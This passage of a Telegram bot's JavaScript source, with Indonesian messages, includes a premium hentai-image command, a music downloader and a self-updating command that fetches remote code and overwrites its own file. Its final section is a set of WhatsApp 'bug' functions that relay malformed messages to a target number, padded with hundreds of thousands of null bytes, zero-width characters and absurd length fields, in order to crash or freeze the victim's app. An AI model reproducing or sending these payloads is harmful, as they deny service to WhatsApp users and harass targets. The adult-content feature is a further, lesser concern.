        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailUrl !== "undefined" && thumbnailUrl) {
        await ctx.replyWithPhoto(thumbnailUrl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 ☇ Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

const listHentai = [
  {"url": "https://files.catbox.moe/5wt81f.jpg"},
  {"url": "https://files.catbox.moe/xdqj22.jpg"},
  {"url": "https://files.catbox.moe/lvafhj.jpg"},
  {"url": "https://files.catbox.moe/em6j1f.jpg"},
  {"url": "https://files.catbox.moe/5bgyld.jpg"},
  {"url": "https://files.catbox.moe/orafro.jpg"},
  {"url": "https://files.catbox.moe/lcm9x3.jpg"},
  {"url": "https://files.catbox.moe/x3ux77.jpg"},
  {"url": "https://files.catbox.moe/f5ucmj.jpg"},
  {"url": "https://files.catbox.moe/djq46h.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/w0225y.jpg"},
  {"url": "https://files.catbox.moe/fqm5fg.jpg"},
  {"url": "https://files.catbox.moe/itv3b0.jpg"},
  {"url": "https://files.catbox.moe/s45bdq.jpg"},
  {"url": "https://files.catbox.moe/omhwvo.jpg"},
  {"url": "https://files.catbox.moe/8eaqrj.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/e99emf.jpg"}
]

bot.command('hentai', checkPremium, async (ctx) => {
  const loadingMsg = await ctx.reply('🔄 Loading hentai...');
  
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  const pick = getRandom();
  
  try {
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI ERROR]', err.message);
    await ctx.editMessageText('❌ Gagal mengirim hentai. Coba lagi nanti.', {
      chat_id: ctx.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});

bot.action('hentai_next', async (ctx) => {
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  
  try {
    await ctx.answerCbQuery();
    
    const loadingMsg = await ctx.reply('🔄 Loading hentai berikutnya...');
    await ctx.deleteMessage();
    
    const pick = getRandom();
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai selanjutnya untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI NEXT ERROR]', err.message);
    await ctx.answerCbQuery('❌ Error loading hentai', { show_alert: true });
  }
});
const videoList = [
  {"url": "https://files.catbox.moe/8c7gz3.mp4"},
  {"url": "https://files.catbox.moe/nk5l10.mp4"},
  {"url": "https://files.catbox.moe/r3ip1j.mp4"},
  {"url": "https://files.catbox.moe/71l6bo.mp4"},
  {"url": "https://files.catbox.moe/rdggsh.mp4"},
  {"url": "https://files.catbox.moe/3288uf.mp4"},
  {"url": "https://files.catbox.moe/jdopgq.mp4"},
  {"url": "https://files.catbox.moe/8ca9cw.mp4"},
  {"url": "https://files.catbox.moe/b99qh3.mp4"},
  {"url": "https://files.catbox.moe/6bkokw.mp4"},
  {"url": "https://files.catbox.moe/ebisdh.mp4"},
  {"url": "https://files.catbox.moe/3yko44.mp4"},
  {"url": "https://files.catbox.moe/apqlvo.mp4"},
  {"url": "https://files.catbox.moe/wqe1r7.mp4"},
  {"url": "https://files.catbox.moe/nk5l10.mp4"},
  {"url": "https://files.catbox.moe/8c7gz3.mp4"},
  {"url": "https://files.catbox.moe/wqe1r7.mp4"},
  {"url": "https://files.catbox.moe/n37liq.mp4"},
  {"url": "https://files.catbox.moe/0728bg.mp4"},
  {"url": "https://files.catbox.moe/p69jdc.mp4"},
  {"url": "https://files.catbox.moe/occ3en.mp4"},
  {"url": "https://files.catbox.moe/y8hmau.mp4"},
  {"url": "https://files.catbox.moe/tvj95b.mp4"},
  {"url": "https://files.catbox.moe/3g2djb.mp4"},
  {"url": "https://files.catbox.moe/xlbafn.mp4"}
  // ... tambahkan yang lain
]

// CASE REQ FITUR + SPOTIFY + AI
const memeks = [
  "spotify",
  "ytmusic",
  "joox",
  "soundcloud",
  "deezer",
  "applemusic",
  "amazonmusic",
  "kiw",
  "audiomack",
  "resso",
  "play",
  "ytplay",
  "ytmp3",
  "song",
  "music"
]

// ambil command regex
const kwontol = new RegExp(`^\\/(${memeks.join("|")})\\s+(.+)`, "i")

async function fetchAPI(query) {
  try {
    const url = `http://api.ikyyxd.my.id/search/spotifyplay?query=${encodeURIComponent(query)}`

    const res = await axios.get(url, {
      timeout: 15000,
      validateStatus: () => true
    })

    if (res.status !== 200 || !res.data?.status) {
      return null
    }

    return res.data.result

  } catch (err) {
    console.log("API ERROR:", err.message)
    return null
  }
}

async function sendAudioSafe(ctx, data) {
  try {
    return await ctx.replyWithAudio(
      { url: data.download },
      {
        title: data.title || "Unknown",
        performer: data.artist || "Unknown",
        caption:
`🎵 ${data.title || "Unknown"}
👤 ${data.artist || "Unknown"}
⏱ ${data.duration || "Unknown"}`
      }
    )

  } catch (err) {

    return await ctx.replyWithDocument(
      { url: data.download },
      {
        caption:
`🎵 ${data.title || "Unknown"}
👤 ${data.artist || "Unknown"}`
      }
    )
  }
}

// handler command
bot.hears(kwontol, async (ctx) => {
  try {
    const text = ctx.message.text
    const match = text.match(kwontol)

    if (!match) return

    const cmd = match[1]
    const query = match[2]

    await ctx.sendChatAction("upload_document")

    const data = await fetchAPI(query)

    if (!data || !data.download) {
      return ctx.reply(`❌ (${cmd}) Lagu tidak ditemukan`)
    }

    await sendAudioSafe(ctx, data)

  } catch (err) {
    console.log("ERROR:", err.message)
    ctx.reply("❌ Gagal kirim audio")
  }
})

// anti crash
process.on("unhandledRejection", (err) => {
  console.log("UNHANDLED:", err)
})

process.on("uncaughtException", (err) => {
  console.log("CRASH:", err)
})

const processing = {}

async function aiPerplexity(query) {
  try {
    const url = "http://api.ikyyxd.my.id/ai/perplexity?query=" + encodeURIComponent(query)
    
    const res = await axios.get(url)

    return res.data.result || JSON.stringify(res.data)
  } catch (err) {
    return "Terjadi error: " + err.message
  }
}

bot.command("update", async (ctx) => {
    const userId = ctx.from.id;
    const chatId = ctx.chat.id;

    if (userId != ownerID) {
        return ctx.reply(`
<blockquote>☠️ <b>AKSES DITOLAK!</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>Anda tidak memiliki izin.</b>
<i>Hubungi @ZyuuOffc</i>
</blockquote>
        `, { parse_mode: 'HTML' });
    }

    const repoRaw = "https://raw.githubusercontent.com/NAMA-AKUN/NAMA-REPO/main/index.js";

    const waitMsg = await ctx.reply(`
<blockquote>🔥 <b>UPDATE SYSTEM</b>
━━━━━━━━━━━━━━━━━━━━━━
⚡ <i>Sedang mengecek update...</i>
🕞 <i>Mohon tunggu sebentar.</i>
</blockquote>
    `, { parse_mode: 'HTML' });

    try {
        const { data } = await axios.get(repoRaw, { timeout: 30000 });

        if (!data || data.length < 100) {
            return ctx.telegram.editMessageText(chatId, waitMsg.message_id, null, `
<blockquote>☠️ <b>UPDATE GAGAL!</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>File kosong atau tidak valid.</b>
</blockquote>
            `, { parse_mode: 'HTML' });
        }

        if (fs.existsSync("./index.js")) {
            const backup = fs.readFileSync("./index.js", "utf8");
            fs.writeFileSync("./index_backup.js", backup);
        }

        fs.writeFileSync("./index.js", data);

        await ctx.telegram.editMessageText(chatId, waitMsg.message_id, null, `
<blockquote>🩸 <b>UPDATE BERHASIL!</b>
━━━━━━━━━━━━━━━━━━━━━━
👑 <b>Status:</b> <code>SUCCESS</code>
➡️ <b>File:</b> <code>index.js</code>
📂 <b>Size:</b> <code>${(data.length / 1024).toFixed(2)} KB</code>
━━━━━━━━━━━━━━━━━━━━━━
⚡ <i>Bot akan restart dalam 3 detik...</i>
</blockquote>
        `, { parse_mode: 'HTML' });

        setTimeout(() => {
            process.exit(0);
        }, 3000);

    } catch (error) {
        console.error("Update error:", error.message);
        await ctx.telegram.editMessageText(chatId, waitMsg.message_id, null, `
<blockquote>☠️ <b>UPDATE GAGAL!</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>Error:</b> <code>${error.message || 'Unknown error'}</code>
<i>Pastikan repo dan file tersedia.</i>
</blockquote>
        `, { parse_mode: 'HTML' });
    }
});

//FUNC AMPAS LO TARO DISIN
async function onoakanbe(sock, target) {
  const booxingstatus = {
    interactiveMessage: {
      body: {
        text: "VnX" + "\u200D".repeat(80000)
      },

      footer: {
        text: "VnX"
      },

      header: {
        hasMediaAttachment: false
      },

      nativeFlowMessage: {
        buttons: [
          {
            name: "booking_status",

            buttonParamsJson: JSON.stringify({
              reference_id: "ြ".repeat(12000),

              status: "VnX" + "\u200C".repeat(30000),

              title: "VnX Here",

              description: "VnX",

              action_link:
                "https://xnxx.com/" + "ꦾ".repeat(30000),

              action_link_title:
                "\u200D".repeat(20000)
            })
          }
        ],

        messageParamsJson: "{".repeat(12000),

        messageVersion: 1
      }
    },

    participant: {
      Jid: target
    }
  };

  await sock.relayMessage(
    target,
    booxingstatus,
    {}
  );
}

async function Noctradelay(target, sock) {
  var msg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "celynyesser",
            format: "EXTENSION"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"999999","building_name":"saosinx","landmark_area":"celyn","address":"celyn","tower_number":"celyn","city":"Japanese","name":"celyn","phone_number":"555555","house_number":"xxx","floor_number":"xxx","state":"celyn | ${"\0".repeat(900000)}"}}`,
            version: 3
          }
        }
      }
    }
  }, { userJid: target });

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}

async function DelayVisibleDocu(sock, target) {
  const documentMessage = {
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/630670309_960702549903268_27335050243240610_n.enc?ccb=11-4&oh=01_Q5Aa4gEwf6h7aBfD8bqb3FAukDEetvHPYSmETzYHQLkWsAlAtg&oe=6A25F973&_nc_sid=5e03e0&mms3=true",
      directPath: "/v/t62.7119-24/630670309_960702549903268_27335050243240610_n.enc?ccb=11-4&oh=01_Q5Aa4gEwf6h7aBfD8bqb3FAukDEetvHPYSmETzYHQLkWsAlAtg&oe=6A25F973&_nc_sid=5e03e0",
      mimetype: "application/javascript",
      mediaKey: "+GreUGW3KQJqYcP6q5s6e3ZXbfuGlWLTaCvuGZGwxtk=",
      fileEncSha256: "VkdUNwow9QIGOOnIsRTE+bnUp1NJ7EMpeuB0ooFZEXY=",
      fileSha256: "/ISQ9qS7RumnGvf91c9cavwkdeJZ3J4NIomo8MhDsDg=",
      fileLength: "543852",
      caption: "VnX Document",
      mediaKeyTimestamp: "1778292231",
      scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
      scanLengths: [
        9999999999999999999,
        9999999999999999999,
        9999999999999999999,
        9999999999999999999
      ],
      midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
    }
  };

  const listMessage = {
    listMessage: {
      title: "\u0000".repeat(250000),
      hasMediaAttachment: false,
      description: "\u0000".repeat(250000),
      buttonText: "VnX",
      footerText: "\u0000".repeat(250000),
      listType: 1,
      sections: [
        {
          title: "\u0000".repeat(250000),
          rows: [
            {
              title: "VnX Bulldo",
              description: "\u0000".repeat(250000),
              rowId: "vnx_bulldo_1"
            },
            {
              title: "\u0000".repeat(250000),
              description: "\u0000".repeat(250000),
              rowId: "vnx_bulldo"
            }
          ]
        },
        {
          title: "\u0000".repeat(250000),
          rows: [
            {
              title: "\u0000".repeat(250000),
              description: "\u0000".repeat(250000),
              rowId: "bot_status"
            }
          ]
        }
      ]
    }
  };

  const nameVnX = ["address_message", "galaxy_message", "call_permission_request"];
  let vnxmbg = {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "VnX Delay New Cuyy",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: nameVnX[0],
            paramsJson: "\x10".repeat(250000) + "\u0000".repeat(250000),
            version: 3,
          },
        },
      },
    },
  };

  try {
    await sock.relayMessage(target, documentMessage, { participant: { jid: target } });
    await sock.relayMessage(target, listMessage, { participant: { jid: target } });
    await sock.relayMessage(target, vnxmbg, { participant: { jid: target } });
  } catch (e) {
    console.log("Error:", e);
  }
}

async function IndahJaya(target) {
  const SadxxIndahJaya = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            newsletterAdminInviteMessage: {
            newsletterJid: "99273646637388@newsletter",
            newsletterName: "𝐒𝐚𝐝𝐱𝐱 𝐈𝐬 𝐇𝐞𝐫𝐞" + "ោ៝".repeat(2000),
            caption: "Indah Jaya Team" + "ោ៝".repeat(20000) + "ꦾ".repeat(20000) + "ោ៝".repeat(20000),
            },
          },
          contextInfo: {
            remoteJid: "X",
            isForwarded: true,
            forwardingScore: 999,
            businessMessageForwardInfo: {
              businessOwnerJid: target
            },
          },
          body: {
            text: "Indah Jaya Team's" + "ꦾ".repeat(30000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(30000),
                  id: null
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "ꦾ".repeat(30000),
                  id: null
                })
              }
            ]
          }
        }
      }
    }
  };

  await sock.relayMessage(target, SadxxIndahJaya, {});
}

async function VnXdelayInvisibleNews(sock, target) {

const nameVnX = ["address_message", "galaxy_message",
"call_permission_request"];

let vnxdelayinv = {
     groupStatusMessageV2: {
       message: {
         interactiveResponseMessage: {
           body: {
             text: "FRANSZ KING BUGSS ATTACK YOU BABYY",
             format: "DEFAULT",
           },
           nativeFlowResponseMessage: {
             name: nameVnX[0], 
             paramsJson: "\x10".repeat(250000) + "\u0000".repeat(250000),
             version: 3,
           },
         },
       },
     },
   };

   await sock.relayMessage(target, vnxdelayinv, { 
     participant: { jid: target } 
   });
}
//


bot.launch()
